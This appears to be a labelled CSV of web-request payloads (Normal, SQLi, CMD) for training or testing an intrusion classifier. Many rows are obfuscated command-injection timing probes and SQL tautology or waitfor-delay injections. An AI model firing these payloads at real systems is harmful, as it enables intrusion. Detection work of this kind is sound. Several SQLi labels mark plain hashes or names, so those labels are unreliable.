payload,label,source
"{""a"":{""b"":""4A2ADAD903F410B532DB6CA95A2DA324""}}",SQLi,obfuscation:json_nested_escape
eval(atob('JTIyZWNobyUyMEVTVkJYViQoKDg5JTJCNjYpKSQoZWNobyUyMEVTVg=='))BXV)ESVBXV%26,CMD,obfuscation:base64_fragment
%2522%3\u0042%20str%3D%24%28\u0065\u0063ho%20BUMB\u0042\u004f%29%3B%20st\u00721%3\u0044%24%7B%23s\u0074r%7\u0044%3\u0042%20if%20%5B%206%20-\u006ee%20%24%7B\u0073t\u00721%7D%20%5D%3B%20\u0074h\u0065\u006e%20\u0073l\u0065\u0065p%200%3\u0042%20else%20s\u006c\u0065\u0065\u0070%201%3\u0042%20fi%20%5C%5\u0043,CMD,obfuscation:unicode_escape
%7C%20%5B%203%20-ｎｅ%20%24%28ｅcho%20GJJXKM%20%7C%20tr%20-d%20%27%5Cｎ%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sｌｅｅp%201%20//,CMD,obfuscation:unicode_normalization
""")pRint(`ECho%20SGrkcg`.`echo%20$((91%2B4))`.`eCho%20sgrKCG`.`EChO%20sGRKCg`)%3B.%22SGrKCG",CMD,obfuscation:case_random
"CONCAT(CHAR(86),CHAR(105),CHAR(116),CHAR(111),CHAR(114),CHAR(105),CHAR(97),CHAR(44),CHAR(43),CHAR(49),CHAR(56),CHAR(53),CHAR(43),CHAR(51),CHAR(63))",SQLi,obfuscation:char_function
eval(atob('cmVxdWVyaWRvciUwMA==')),SQLi,obfuscation:base64_fragment
580197218E25C80E7B8ABABDA1529A61,Normal,csic_gsi:cisc_normalTraffic_test.txt
656897B7C5684F939D16419FB6D133A1,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('Mjc5Ng==')),SQLi,obfuscation:base64_fragment
%7C%20%5B%203%20-ne%20%24%28echo%20GJJXKM%%0020%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//,CMD,obfuscation:null_byte
ducharme@porqueagel.la,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20STR%3d%24%28Echo%20KqpSNd%29%0a%20StR1%3D%24%7b%23Str%7d%0a%20If%20%5b%208%20-Ne%20%24%7bSTR1%7d%20%5d%0a%20Then%20SlEep%200%0A%20elSE%20SLeeP%201%0a%20fi%20%2522,CMD,obfuscation:case_random
93E5451806D3FD622CD9F6AA9F3C4C39,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%26%00%20sleep%200%20%26%26%20str%3D%24%28echo%20JTLWWU%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,obfuscation:null_byte
"--WebKitFormBoundary25999
Content-Disposition: form-data; name=""q""

77733072H
--WebKitFormBoundary25999--",SQLi,obfuscation:multipart_boundary_sim
0703537056337149,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=2&nombre=Jam�n+Ib�rico&precio=39&cantidad=7&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
%20echo%20GRYEIF$((54%2B91))$(echo%20GRYEIF)GRYEIF&,CMD,seclists_cmd
79895D77C86C6FF19EBBC97255A3B59F/*--*/,SQLi,obfuscation:nested_comment
eval(atob('NjU=')),SQLi,obfuscation:base64_fragment
5AD4859EE9AD7B5BF9A699B795AD3A32,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"CONCAT(CHAR(49),CHAR(54),CHAR(51),CHAR(57),CHAR(51))",SQLi,obfuscation:char_function
0D4B760A2A503BAE40CF0F23040AA28C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id%253D2%2526nombre%253DJam%25EF%25BF%25BDn%252BIb%25EF%25BF%25BDrico%2526precioA%253D100%2526cantidad%253D41%2526B1%253DA%25EF%25BF%25BDadir%252Bal%252Bcarrito,SQLi,obfuscation:double_url_encode
eval(atob('bW9kbz1lbnRyYXImbG9naW49c291Y2llNiZwd2Q9M2Zpc3RvbDIzJg=='))remember=off/&B1=Entrar,SQLi,obfuscation:base64_fragment
"{""a"":{""b"":""7701""}}",SQLi,obfuscation:json_nested_escape
05404,Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('RkE0Qjc1ODcyRUFFMDM5QTc1NTM1QUJBN0YzOEY1RjY=')),SQLi,obfuscation:base64_fragment
eval(atob('O2VjaG8kSUZTQ0dWQ1haJCgoNjYlMkI2MSkpJChlY2hvJElGU0NHVg=='))CXZ)CGVCXZ,CMD,obfuscation:base64_fragment
eval(atob('OTVBNjcyNjFFOTJGMzRCODNGMDdEQzlGNTQzMEQ4MUQ=')),SQLi,obfuscation:base64_fragment
id=1&id=5A8AAADF68610C55B2AC2C25A48995D6,SQLi,obfuscation:hpp_duplicate_param
9FA4354BEF3734F9A438ACD181513035,Normal,csic_gsi:cisc_normalTraffic_test.txt
BB273C8282%003EA26D70F2D92979C8716F,SQLi,obfuscation:null_byte
CA596C25ED28CEEB1220E5EB257F6462,Normal,csic_gsi:cisc_normalTraffic_test.txt
|echo$IFSJEBQGT$((57%2B73))$(echo$IFSJEBQGT)JEBQGT&,CMD,seclists_cmd
"modo=registro&login=jagath&password=azOrR1RsE&nombreA=Sili&apellidos=Masl%00o+Arrunategui&email=davray.chayevsky4@sierradealcaraz.um&dni=97290360S&direccion=C/+Galindez+De+Carvajal,+27+&ciudad=San+Miguel+de+Serrezuela&cp=09692&provincia=Le�n&ntc=8772164486474313&B1=Registrar",SQLi,obfuscation:null_byte
0899994966261752,Normal,csic_gsi:cisc_normalTraffic_test.txt
"C/+Geranio,+65+",Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&id=id=3&nombre=Vino+Rioja&precio=100&cantidad=+&B1=A�adir+al+carrito,SQLi,obfuscation:hpp_duplicate_param
"\u006d\u006fdo=entrar&logi\u006e=\u006c\u0065\u006d\u006die&\u0070\u0077\u0064=\u0049n\u0074\u0065\u004d\u0050es\u0054I+\u0076\u006f&re\u006de\u006d\u0062er=','0','0','0','0');wait\u0066o\u0072+dela\u0079+'0:0:15';--&B1=Entra\u0072",SQLi,obfuscation:unicode_escape
modo=insertar&precio=1665&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
158BF8CA5982F76B823847B2897E45A2,Normal,csic_gsi:cisc_normalTraffic_test.txt
%252526echo%2524IFSWBFNGR%2524%2528%25286%25252B4%2529%2529%2524%2528echo%2524IFSWBFNGR%2529WBFNGR%25255C%25255C,CMD,obfuscation:double_url_encode
0317A2C5224F31C3E14458D06F7EAF87,Normal,csic_gsi:cisc_normalTraffic_test.txt
Santa+Mar�a+dｅｌ+Cｕbiｌlo,SQLi,obfuscation:unicode_normalization
42093532J,Normal,csic_gsi:cisc_normalTraffic_train.txt
5F20B36DD409B2066AAAC1CE335DF4E6,Normal,csic_gsi:cisc_normalTraffic_test.txt
4193fda68A62B7da86Ba3F83305F56a3,SQLi,obfuscation:case_random
mott@hostprofessional.ma/*--*/,SQLi,obfuscation:nested_comment
Ita%00llia%3F,SQLi,obfuscation:null_byte
mayi/*--*/,SQLi,obfuscation:nested_comment
%3B%20str%3D%24%28echo%20TSUCKA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,CMD,seclists_cmd
1840594959799208' OR '1'='1,SQLi,obfuscation:logic_or_tautology
Hu�neja,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4B713E7D50C5E26E80B197680EC7CD9B,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%250aecho%24IFSUOWFKR%24%28%2867%252B63%29%29%24%28echo%24IFSUOWFKR%29UOWFKR,CMD,obfuscation:url_encode
\u0045\u0045D\u0044\u0042FF9\u0046A46C\u0041\u00439C38F\u0046\u0041113FD8B152,SQLi,obfuscation:unicode_escape
+?Even,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""5BB6B64C84DE79B051BFD592453F5BE3""}}",SQLi,obfuscation:json_nested_escape
D2407C925E3EB064871EB27DCD1C0D53,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""%3B\u0065\u0063ho$\u0049\u0046\u0053\u0053\u0054\u0056\u0048DV$((56%2B21))$(\u0065\u0063\u0068\u006f$I\u0046\u0053S\u0054\u0056\u0048DV)S\u0054\u0056HDV",CMD,obfuscation:unicode_escape
id=1&id=21898288B,SQLi,obfuscation:hpp_duplicate_param
Andr%00eas,SQLi,obfuscation:null_byte
%7C%20%5\u0042%204%20-ne%20%24%28\u0065ch\u006f%20Q\u004a\u0044BJ\u004e%20%7C%20tr%20-d%20%27%5\u0043\u006e%27%20%7C%20\u0077c%20-c%29%20%5\u0044%20%7C%7\u0043%20sl\u0065\u0065p%201%20%27,CMD,obfuscation:unicode_escape
id=1&id=modo=insertar&precio=8083&B1A=Confirmar,SQLi,obfuscation:hpp_duplicate_param
"--WebKitFormBoundary75259
Content-Disposition: form-data; name=""q""

%0A%20str%3D%24%28echo%20YCSCIW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//
--WebKitFormBoundary75259--",CMD,obfuscation:multipart_boundary_sim
M0x6f72eda+de+�lava,SQLi,obfuscation:hex_escape
E0D7FF8DAC7D84F6F419918CB779A69B/*--*/,SQLi,obfuscation:nested_comment
F31F47CA4076F0E355F05EFBEB7ECB2C' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%0\u0041%20\u0073tr%3D%24%28echo%20\u0047\u004a\u0041N\u0047U%29%0A%20s\u0074r1%3D%24%7\u0042%23\u0073tr%7\u0044%0\u0041%20if%20%5B%209%20-ne%20%24%7\u0042str1%7\u0044%20%5D%0\u0041%20t\u0068\u0065n%20s\u006c\u0065\u0065p%200%0A%20else%20\u0073l\u0065\u0065\u0070%201%0A%20fi%20,CMD,obfuscation:unicode_escape
%252522%252520echo%252520PPHMUH%2524%2528%252817%25252B73%2529%2529%2524%2528echo%252520PPHMUH%2529PPHMUH%2522,CMD,obfuscation:double_url_encode
%252527%25253B%252520str%25253D%252524%252528echo%252520QZBRFT%252529%25253B%252520str1%25253D%252524%25257B%252523str%25257D%25253B%252520if%252520%25255B%2525207%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25253B%252520then%252520sleep%2525200%25253B%252520else%252520sleep%2525201%25253B%252520fi%252520%2525255C%2525255C,CMD,obfuscation:double_url_encode
%26ecHo$ifsfXpyjN$((43%2b47))$(EChO$ifsfXPyjN)fXpyjn%22,CMD,obfuscation:case_random
Magaｌｉ,SQLi,obfuscation:unicode_normalization
%26ｅchｏ%20MHDYGG$((49%2B88))$(ｅchｏ%20MHDYGG)MHDYGG%22,CMD,obfuscation:unicode_normalization
id%3D3%26nombreA%3DVino%2BRioja%26precio%3D100%26cantidad%3D85%26B1%3DA%EF%BF%BDadir%2Bal%2Bcarrito,SQLi,obfuscation:url_encode
Rezabal,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Hermelinda' OR '1'='1,SQLi,obfuscation:logic_or_tautology
9ABB54B8E8E8290E66C36D017992731A,Normal,csic_gsi:cisc_normalTraffic_test.txt
%257Cecho%2520SESECV%24%28%2872%252B10%29%29%24%28echo%2520SESECV%29SESECV%5C,CMD,obfuscation:url_encode
351BA0622A7BA0323CB5777E449BAC60,Normal,csic_gsi:cisc_normalTraffic_test.txt
"{""a"":{""b"":""Casadej�s+Mico""}}",SQLi,obfuscation:json_nested_escape
7aF513A8ce6091B9ACA302f7483c8f71,SQLi,obfuscation:case_random
0F4999BD3453CD233E8DB9DAD5436F8C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""994A447AFE2F312EE5F73D30D08132CF""}}",SQLi,obfuscation:json_nested_escape
%25253B%252520str%25253D%252524%252528echo%252520YSDKBB%252529%25253B%252520str1%25253D%252524%25257B%252523str%25257D%25253B%252520if%252520%25255B%2525201%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25253B%252520then%252520sleep%2525200%25253B%252520else%252520sleep%2525201%25253B%252520fi%252520%252527,CMD,obfuscation:double_url_encode
e6FCff951BF1A3E37e55895Fc11582D5,SQLi,obfuscation:case_random
5184808771839231/*--*/,SQLi,obfuscation:nested_comment
"CONCAT(CHAR(53),CHAR(52),CHAR(48),CHAR(52),CHAR(50),CHAR(54),CHAR(54),CHAR(48),CHAR(53),CHAR(56),CHAR(57),CHAR(55),CHAR(55),CHAR(51),CHAR(56))",SQLi,obfuscation:char_function
7781,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary31354
Content-Disposition: form-data; name=""q""

2B68402C2DFABA9B3053B452EEFE7EB5
--WebKitFormBoundary31354--",SQLi,obfuscation:multipart_boundary_sim
%2527%0A%20str%3D%2%004%28echo%20JKJFEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,obfuscation:null_byte
id=1&id=A240A78FE0900DFF2CB3D901D6584A89,SQLi,obfuscation:hpp_duplicate_param
75878234S,Normal,csic_gsi:cisc_normalTraffic_test.txt
F570DC3A0BC5FBF7B632273%00BB0C76176,SQLi,obfuscation:null_byte
a296308A85b4c53042744eA023DB4E31,SQLi,obfuscation:case_random
%7C%20%5B%209%20-ne%20%24%28echo%20CXWPXJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,seclists_cmd
eval(atob('JTIyZWNobyUyMEZHRUlNQSQoKDE5JTJCODcpKSQoZWNobyUyMEZHRQ=='))IMA)FGEIMA,CMD,obfuscation:base64_fragment
&echo$IFSLMIPEM$((82%2B21))$(echo$IFSLMIPEM)LMIPEM%22,CMD,seclists_cmd
Matar%EF%BF%BD%2BI%EF%BF%BDiguez,SQLi,obfuscation:url_encode
ED02C6418BC5668FCFEBC96EE7085E06' OR '1'='1,SQLi,obfuscation:logic_or_tautology
1540C42938A035E860AEEF602D52BFD0,Normal,csic_gsi:cisc_normalTraffic_test.txt
dELito,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('JTdDZWNobyRJRlNQVlJSVEYkKCg5NCUyQjI1KSkkKGVjaG8kSUZTUA=='))VRRTF)PVRRTF%27,CMD,obfuscation:base64_fragment
eval(atob('OEIyOEVGNUU1QTI2MEYzQzY2QTc3NjY4NEE4MDQ5NzA=')),SQLi,obfuscation:base64_fragment
%0\u0061ech\u006f$\u0049\u0046\u0053EW\u0050WS\u0058$((63%2B88))$(ec\u0068o$\u0049F\u0053E\u0057P\u0057SX)EWP\u0057\u0053X%7C,CMD,obfuscation:unicode_escape
tiedeman,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('NEUxODEwMjlGQ0RFRjQyNDI1QjU2ODAxMUIxQzA2OUM=')),SQLi,obfuscation:base64_fragment
%252527%257Cecho%252520WEYPRV%2524%2528%252818%25252B9%2529%2529%2524%2528echo%252520WEYPRV%2529WEYPRV%2526,CMD,obfuscation:double_url_encode
C67E1906134F912D8864F0CBA82A5AFC,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%253B%2520str%253D%2524%2528echo%2520RCYHEM%2529%253B%2520str1%253D%2524%257B%2523str%257D%253B%2520if%2520%255B%25204%2520-ne%2520%2524%257Bstr1%257D%2520%255D%253B%2520then%2520sleep%25200%253B%2520else%2520sleep%25201%253B%2520fi%2520%2522,CMD,obfuscation:url_encode
eval(atob('Ii5wcmludChgZWNobyUyME1HR0lCSFxuZWNobyUyMCQoKDY5JTJCNA=='))))\necho%20MGGIBH\necho%20MGGIBH`)%3B%25252529%2525257DMGGIBH,CMD,obfuscation:base64_fragment
"--WebKitFormBoundary85130
Content-Disposition: form-data; name=""q""

Astorga
--WebKitFormBoundary85130--",SQLi,obfuscation:multipart_boundary_sim
%22%0\u0041%20\u0073t\u0072%3\u0044%24%28\u0065\u0063ho%20VY\u0043NR\u0050%29%0\u0041%20st\u00721%3\u0044%24%7\u0042%23\u0073\u0074r%7D%0A%20if%20%5B%201%20-\u006e\u0065%20%24%7Bstr1%7D%20%5D%0A%20th\u0065\u006e%20sleep%200%0A%20el\u0073e%20sl\u0065\u0065\u0070%201%0\u0041%20\u0066\u0069%20%22,CMD,obfuscation:unicode_escape
nacarig�e,Normal,csic_gsi:cisc_normalTraffic_test.txt
frAgMENTAr,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary34001
Content-Disposition: form-data; name=""q""

7730
--WebKitFormBoundary34001--",SQLi,obfuscation:multipart_boundary_sim
"{""a"":{""b"":""9408537ED611F6052BA88BA07E50F442""}}",SQLi,obfuscation:json_nested_escape
%3Bｅchｏ%20HFWMJZ$((75%2B92))$(echo%20HFWMJZ)HFWMJZ|,CMD,obfuscation:unicode_normalization
%7C%20%5B%209%20-ne%20%24%28ｅcho%20HZZOKR%20%7C%20ｔr%20-d%20%27%5Cｎ%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20ｓｌｅｅp%201%20%26,CMD,obfuscation:unicode_normalization
modo=insertar&precio=8305&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calle+Rejas,+23,+4?B",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=pistilli&password=PErVErTIMieNto&nombre=Delfo&apellidos=Berzoni+Arzaluz&email=starkey@mcfly.kg&dni=29973823Q&direccion=';waitfor+delay+'0:0:15';--&ciudad=Cabez�n+de+Cameros&cp=28691&provincia=Teruel&ntc=7673189630192545&B1=Registrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520QHSDUY%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25208%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%252522,CMD,obfuscation:url_encode
"--WebKitFormBoundary36015
Content-Disposition: form-data; name=""q""

San+Morales
--WebKitFormBoundary36015--",SQLi,obfuscation:multipart_boundary_sim
t\u0068\u0069,SQLi,obfuscation:unicode_escape
%257Cecho%2524IFSJJVJHF%2524%2528%252877%25252B32%2529%2529%2524%2528echo%2524IFSJJVJHF%2529JJVJHF%255C,CMD,obfuscation:double_url_encode
68E43581D8D9D2F30C676B92EDEC49CF,Normal,csic_gsi:cisc_normalTraffic_test.txt
gayera/*--*/,SQLi,obfuscation:nested_comment
)pRINt(`EchO%20dPBgWu%0AeCho%20$((48%2B67))%0aEcHo%20dPBGWu%0AECHO%20dPbgwu`)%3b.%252522DpBGWU,CMD,obfuscation:case_random
%22%0A%20str%3D%24%28echo%20WXKPIW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%2%000sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C,CMD,obfuscation:null_byte
E79A7441E968A8B12084646391653C5B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22.print%28%60echo%2520XKLFAP%250aecho%2520%24%28%2876%252B43%29%29%250aecho%2520XKLFAP%250aecho%2520XKLFAP%60%29%253B.%25252527XKLFAP,CMD,obfuscation:url_encode
75297650FCF5AE8A249475753CBA9A8E,Normal,csic_gsi:cisc_normalTraffic_test.txt
F218BDEF0035A677BC5A237484A7B54C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
|\u0065cho$\u0049\u0046\u0053TP\u0055\u0041\u0050\u0048$((74%2B20))$(\u0065\u0063ho$\u0049\u0046STPUAP\u0048)TPUA\u0050\u0048,CMD,obfuscation:unicode_escape
443FAFBB46061EF7AAD6CB62CF46FA9D,Normal,csic_gsi:cisc_normalTraffic_train.txt
"C/+Arbelaiz,+30,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
eval(atob('MTkwQjg1ODdFRTIyNTA3NTU2MTM3M0VDQzVCODlGRDE=')),SQLi,obfuscation:base64_fragment
eval(atob('JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyMERPSU1WWSUyOSUwQSUyMA=='))str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,obfuscation:base64_fragment
2BF0C897BAB9AB2B1A63EB7E7F69C517,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
739E2DD5B1685DCC9EFDCEB6678F3420,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%20\u0065\u0063h\u006f%20\u0052W\u0046\u0042CU$((99%2B46))$(\u0065\u0063ho%20\u0052\u0057FB\u0043U)RW\u0046\u0042CU%5\u0043%5C,CMD,obfuscation:unicode_escape
F4AEE8A54BD59CE3C87901D32F449D1C,Normal,csic_gsi:cisc_normalTraffic_train.txt
09746972C47C74157B676A37F988A722,Normal,csic_gsi:cisc_normalTraffic_test.txt
9A28C59398B29C280E9C42C8D8EECE22,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
75586196p,SQLi,obfuscation:case_random
eval(atob('JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyMEJZVUpVUyUyOSUwQSUyMA=='))str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,obfuscation:base64_fragment
;ｅcho%20ESBMYC$((3%2B57))$(echo%20ESBMYC)ESBMYC,CMD,obfuscation:unicode_normalization
"CONCAT(CHAR(65),CHAR(118),CHAR(105),CHAR(108),CHAR(65533),CHAR(115))",SQLi,obfuscation:char_function
"--WebKitFormBoundary67629
Content-Disposition: form-data; name=""q""

%26%26echo%20YAEFHT$((74%2B26))$(echo%20YAEFHT)YAEFHT%26
--WebKitFormBoundary67629--",CMD,obfuscation:multipart_boundary_sim
B14C711C9344F1A2E6268EE52D46287C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%25253B%252520str%25253D%252524%252528echo%252520OIPHJR%252529%25253B%252520str1%25253D%252524%25257B%252523str%25257D%25253B%252520if%252520%25255B%2525205%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25253B%252520then%252520sleep%2525200%25253B%252520else%252520sleep%2525201%25253B%252520fi%252520%25252526,CMD,obfuscation:double_url_encode
"""&\u0065c\u0068o%20TFMD\u0047\u004e$((33%2B82))$(\u0065cho%20\u0054FMD\u0047\u004e)\u0054\u0046\u004dDG\u004e%27",CMD,obfuscation:unicode_escape
eval(atob('MkNEQTQ0OTk1NEJERDA3NDhBMDc4MEMxRjE0NkI0RkI=')),SQLi,obfuscation:base64_fragment
C\u0061t\u0061d\u0061\u0075,SQLi,obfuscation:unicode_escape
%3B%20str%3D%24%28echo%20GZPDPD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,seclists_cmd
'%0aecho%20IMHMUF%00$((78%2B85))$(echo%20IMHMUF)IMHMUF%5C%5C,CMD,obfuscation:null_byte
0144C0BFAE3EBE92B834D7BA6314B5B9,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%3B%20str%3D%24%28echo%20GJNRXW%29%3B%20str1%3D%24%7B%23str%7D%3%00B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522,CMD,obfuscation:null_byte
7d65837694fe8e6600Eb432A46255cFf,SQLi,obfuscation:case_random
585C5EAF6DBEAAB63CD6FA1A14B61A0A,Normal,csic_gsi:cisc_normalTraffic_test.txt
miric@deuxmanagement.an,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&id=10334,SQLi,obfuscation:hpp_duplicate_param
eval(atob('JTIwZWNobyUyMFJHTUNMSSQoKDI3JTJCNzUpKSQoZWNobyUyMFJHTQ=='))CLI)RGMCLI%2F%2F,CMD,obfuscation:base64_fragment
30503437D,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%7C%20%5B%208%20-ne%20%24%28echo%20PSPAPE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
47A\u0045D\u0046684\u0041B5E550943481009A0FB\u0041B1,SQLi,obfuscation:unicode_escape
"--WebKitFormBoundary17690
Content-Disposition: form-data; name=""q""

'.print(`echo%20KVAVOQ`.`echo%20$((63%2B81))`.`echo%20KVAVOQ`.`echo%20KVAVOQ`)%3B//KVAVOQ
--WebKitFormBoundary17690--",CMD,obfuscation:multipart_boundary_sim
0\u00434\u00413D77A5DFF61320B836FB9D0C8F78,SQLi,obfuscation:unicode_escape
%26%26echo%20WLJUON$((15%2B95))$(echo%20WLJUON)WLJUON\,CMD,seclists_cmd
"--WebKitFormBoundary85526
Content-Disposition: form-data; name=""q""

%26echo$IFSXQTVXE$((32%2B91))$(echo$IFSXQTVXE)XQTVXE//
--WebKitFormBoundary85526--",CMD,obfuscation:multipart_boundary_sim
E5966A3374FE8D239FA45200DF6178B5,Normal,csic_gsi:cisc_normalTraffic_train.txt
2D7B6BCBF446A23FAD63672C580D5135,Normal,csic_gsi:cisc_normalTraffic_train.txt
"{""a"":{""b"":""ettson""}}",SQLi,obfuscation:json_nested_escape
'\u0065\u0063ho%20V\u004bY\u0059J\u0059$((60%2B15))$(echo%20\u0056K\u0059Y\u004a\u0059)\u0056\u004b\u0059\u0059JY',CMD,obfuscation:unicode_escape
"--WebKitFormBoundary97041
Content-Disposition: form-data; name=""q""

%27%7C%20%5B%209%20-ne%20%24%28echo%20JTXVKL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20
--WebKitFormBoundary97041--",CMD,obfuscation:multipart_boundary_sim
8a5a2E5484a228B5e79bc303Bf0fA9C8,SQLi,obfuscation:case_random
id=1&id=bao,SQLi,obfuscation:hpp_duplicate_param
8C0B87578733CDD450E267025CADD97A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8E307BAC2FE5B1A7D30F67429CEBC814,Normal,csic_gsi:cisc_normalTraffic_train.txt
99%00942317A,SQLi,obfuscation:null_byte
"--WebKitFormBoundary61404
Content-Disposition: form-data; name=""q""

margraviato
--WebKitFormBoundary61404--",SQLi,obfuscation:multipart_boundary_sim
"{""a"":{""b"":""novelia""}}",SQLi,obfuscation:json_nested_escape
ramaprak,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=moeschet&password=FAstiD?Ioso&nombre=VahidReza&apellidos=Yacu+*m�+Loggi_odice&email=uray@hosterialasmajadillas.pt&dni=79928493C&direccion=Dido+162,+&ciudad=Aldeanueva+de+Ebro&cp=50001&provincia=Madrid&ntc=6010532265403807&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('MEE3OUEwNjQ0NjczRkY2MEVFMThGMkZCQzE2ODRDOEI=')),SQLi,obfuscation:base64_fragment
0F4999B%00D3453CD233E8DB9DAD5436F8C,SQLi,obfuscation:null_byte
